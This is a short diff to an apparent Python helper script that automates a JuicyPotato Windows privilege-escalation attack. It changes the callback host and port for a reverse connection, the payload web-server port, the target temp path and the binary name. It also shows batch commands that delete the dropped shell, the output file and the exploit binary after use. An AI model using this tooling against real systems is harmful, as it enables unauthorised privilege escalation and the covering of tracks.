@@ -2,13 +2,12 @@ import os
 
 #CHANGE ME
 
-JUICY_REMOTE_PATH='C:\\wamp\\www\\PHP\\install\\fileManager\\collectives\\DG0\\AXE'
+JUICY_REMOTE_PATH='C:\\Users\\<username>\\AppData\\Local\\Temp'
 CLSID_file = "wordlist/w7_enterprise.list"
-LHOST="192.168.119.142"
+LHOST="10.10.10.10"
 LPORT="443"
 LWEBSERVER_PORT="80"
-JUICY_POTATO_BIN = "JuicyPotatox86.exe"
-
+JUICY_POTATO_BIN = "JuicyPotato.exe"
 
 
 #IF DEFAULT, DO NOT CHANGE
@@ -56,7 +55,7 @@ def create_bat_potato():
         file.write("del {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
         file.write("del {JUICY_REMOTE_PATH}\\{OUTPUT_BAT_NAME}")
         file.write("del {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
-        
+
         file.close()
         print(f"{bcolors.OKGREEN}[+] {OUTPUT_BAT_NAME} created.{bcolors.OKGREEN}")
 
